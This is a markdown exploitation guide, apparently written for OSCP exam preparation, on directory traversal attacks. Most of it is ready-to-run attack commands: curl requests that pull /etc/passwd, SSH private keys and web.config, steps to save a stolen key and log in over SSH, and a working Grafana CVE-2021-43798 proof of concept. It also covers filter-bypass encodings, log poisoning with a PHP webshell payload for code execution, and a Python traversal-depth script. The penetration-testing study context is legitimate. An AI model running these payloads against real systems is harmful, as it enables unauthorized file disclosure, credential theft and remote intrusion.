# Directory Traversal Exploitation Guide

## Overview
Directory traversal (path traversal) vulnerabilities allow attackers to access files outside the web root directory by manipulating file paths with sequences like `../` or `..\`. This guide documents practical exploitation techniques from real-world scenarios.

## Core Concepts

### How It Works
Web applications serve files from a base directory (web root):
- **Linux**: `/var/www/html/`
- **Windows**: `C:\inetpub\wwwroot\`

When vulnerable, attackers can use relative paths (`../`) to escape the web root and access sensitive system files.

### Key Indicators
Look for parameters that:
- Reference files directly (e.g., `?page=about.html`)
- Include file extensions in values
- Use include/require functions (PHP)
- Load templates or plugins

## Identification Methodology

### 1. Information Gathering
```bash
# Check technology stack
curl -I http://target.com/page.php
# -I: Headers only (identifies PHP, ASP, server version)

# Map application structure
# - Hover over ALL links and buttons
# - Note directory paths (/cms/, /admin/)
# - Identify file parameters
```

### 2. Parameter Analysis
Example vulnerable URL patterns:
```
http://site.com/index.php?page=admin.php
http://site.com/view?file=report.pdf
http://site.com/public/plugins/welcome/config.js
```

### 3. Testing for Vulnerability
```bash
# Linux - Test with /etc/passwd
curl "http://target.com/index.php?page=../../../../../etc/passwd"

# Windows - Test with hosts file
curl "http://target.com/index.php?page=..\..\..\..\Windows\System32\drivers\etc\hosts"
```

## Exploitation Techniques

### Linux Targets

#### Step 1: Enumerate Users
```bash
# Extract /etc/passwd
curl "http://target.com/index.php?page=../../../../../etc/passwd"

# Parse for users with shell access
curl "http://target.com/index.php?page=../../../../../etc/passwd" | grep -E ":/bin/bash|:/bin/sh"
```

#### Step 2: Extract SSH Keys
```bash
# Target private keys
curl "http://target.com/index.php?page=../../../../../home/USERNAME/.ssh/id_rsa"

# Common locations:
# /home/[user]/.ssh/id_rsa
# /home/[user]/.ssh/id_dsa
# /home/[user]/.ssh/id_ecdsa
# /home/[user]/.ssh/id_ed25519
# /root/.ssh/id_rsa (if readable)
```

#### Step 3: Leverage Access
```bash
# Save key properly
curl "http://target.com/index.php?page=../../../../../home/user/.ssh/id_rsa" | sed -n '/-----BEGIN/,/-----END/p' > stolen_key

# Fix permissions (REQUIRED for SSH)
chmod 400 stolen_key
# 400: Read-only for owner - SSH requires this

# Connect
ssh -i stolen_key -p 2222 user@target.com
# -i: Specify identity file
# -p: Non-standard port
```

### Windows Targets

#### Key Differences
- Use `\` or `/` in traversal sequences
- No direct SSH key equivalent
- Focus on configuration files

#### High-Value Files
```bash
# IIS Configuration (often contains passwords)
curl "http://target.com/index.php?page=..\..\..\..\inetpub\wwwroot\web.config"

# IIS Logs
curl "http://target.com/index.php?page=..\..\..\..\inetpub\logs\LogFiles\W3SVC1\u_ex[DATE].log"

# Other sensitive files
# C:\Windows\System32\config\SAM (usually restricted)
# C:\Windows\repair\SAM (backup, sometimes readable)
# C:\Windows\System.ini
# C:\Users\[username]\Desktop\*.txt
```

## Real-World Case Studies

### Case 1: Mountain Desserts (PHP/Linux)
**Target**: 192.168.187.16
**Vulnerable Parameter**: `?page=`
**Exploitation Path**:
1. Identified parameter from "Admin" link
2. Confirmed vulnerability with /etc/passwd
3. Found user: `offsec`
4. Retrieved SSH key: `/home/offsec/.ssh/id_rsa`
5. Gained shell access on port 2222

**Key Command**:
```bash
curl "http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa"
```

### Case 2: Grafana CVE-2021-43798 (Windows)
**Target**: 192.168.187.193:3000
**Vulnerability**: Unauthenticated path traversal in plugin assets
**Critical Factor**: Must use `curl --path-as-is`

**Exploitation**:
```bash
# The --path-as-is flag is CRUCIAL
# Without it, curl normalizes ../ and exploit fails
curl --path-as-is http://192.168.187.193:3000/public/plugins/welcome/../../../../../../../../../../Users/install.txt
```

**Why --path-as-is?**
- Browsers automatically normalize `../` sequences
- Regular curl also normalizes paths
- `--path-as-is` preserves the exact path, allowing traversal

**Valid Plugin IDs for Grafana**:
- welcome
- alertlist
- graph
- dashlist
- text
- news
- gauge

## Advanced Techniques

### Bypassing Filters

#### URL Encoding
```bash
# Single encoding
%2e%2e%2f = ../
%2e%2e%5c = ..\

# Double encoding (if single is filtered)
%252e%252e%252f = ../
```

#### Alternative Sequences
```bash
# If ../ is blocked, try:
....//  (becomes ../ after filter)
..;/
..\
..\/
```

#### Null Byte Injection (older systems)
```bash
# Bypass extension checks
?file=../../../etc/passwd%00.jpg
```

### Using Directory Traversal for RCE

#### Log Poisoning (Apache/Linux)
```bash
# 1. Poison log with PHP code
curl "http://target.com/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# 2. Include poisoned log via traversal
curl "http://target.com/index.php?page=../../../../../var/log/apache2/access.log&cmd=id"
```

#### Session File Inclusion (PHP)
```bash
# 1. Control session data
# 2. Include session file
?page=../../../../../tmp/sess_[PHPSESSID]
```

## Tools Beyond curl

### Burp Suite
- Better for complex testing
- Handles cookies/sessions
- Intruder for fuzzing traversal depth

### Custom Scripts
```python
# Quick traversal depth finder
import requests

url = "http://target.com/index.php"
file_to_read = "etc/passwd"
for i in range(1, 15):
    payload = "../" * i + file_to_read
    r = requests.get(url, params={"page": payload})
    if "root:x:0:0" in r.text:
        print(f"Found at depth {i}: {payload}")
        break
```

### wfuzz
```bash
# Fuzz traversal depth
wfuzz -c -z range,1-10 --hw 0 "http://target.com/index.php?page=FUZZ/etc/passwd"
```

## Troubleshooting

### Issue: No Output
- Try different traversal depths (5-15 ../s)
- Test both `/` and `\` on Windows
- Check if output is in HTML comments
- Use curl instead of browser

### Issue: Filtered Characters
- Try URL encoding
- Use alternative sequences
- Test case variations (..%2F, ..%5C)

### Issue: Can't Find Sensitive Files
- Start with known files (/etc/passwd, hosts)
- Check web server config locations
- Look for backup files (.bak, .old, ~)
- Try environment-specific paths

## OSCP Exam Tips

### Documentation Requirements
1. Screenshot the vulnerable parameter
2. Show successful file retrieval
3. Document full exploitation path
4. Include all commands with output

### Time-Saving Strategies
1. Always test common files first:
   - Linux: `/etc/passwd`, `/etc/hosts`
   - Windows: `Windows\System32\drivers\etc\hosts`
2. Use curl over browser for accuracy
3. Check for world-readable SSH keys immediately
4. Keep a traversal depth cheatsheet

### Common Pitfalls
- Forgetting `chmod 400` on SSH keys
- Not trying both `/` and `\` on Windows
- Missing the `--path-as-is` flag for certain exploits
- Giving up at wrong traversal depth

## Quick Reference Card

### Linux One-Liners
```bash
# Test vulnerability
curl "http://t/index.php?page=../../../../etc/passwd"

# Get SSH key
curl "http://t/index.php?page=../../../../home/USER/.ssh/id_rsa" > key && chmod 400 key

# Connect
ssh -i key -p PORT user@target
```

### Windows One-Liners
```bash
# Test vulnerability
curl "http://t/index.php?page=..\..\..\..\Windows\System32\drivers\etc\hosts"

# Get web.config
curl "http://t/index.php?page=..\..\..\..\inetpub\wwwroot\web.config"
```

### Grafana CVE-2021-43798
```bash
# MUST use --path-as-is
curl --path-as-is http://target:3000/public/plugins/welcome/../../../../../../../../etc/passwd
```

## Key Takeaways

1. **Always use curl for testing** - browsers normalize paths
2. **Try multiple traversal depths** - web root locations vary
3. **Test both slashes on Windows** - some apps only accept backslashes
4. **Check SSH keys on Linux immediately** - fastest path to shell
5. **Document everything** - critical for OSCP reporting
6. **The --path-as-is flag** - essential for certain vulnerabilities

## Flags Reference
```bash
# curl flags for directory traversal
-s         # Silent mode (no progress bar)
-I         # Headers only
-L         # Follow redirects
--path-as-is  # Don't normalize path (CRITICAL for some exploits)

# SSH flags for stolen keys
-i key     # Identity file (private key)
-p 2222    # Port specification
-o StrictHostKeyChecking=no  # Skip host key verification

# chmod for SSH keys
400        # Read-only for owner (required by SSH)
```

---
*Document created from practical exploitation experience during OSCP preparation*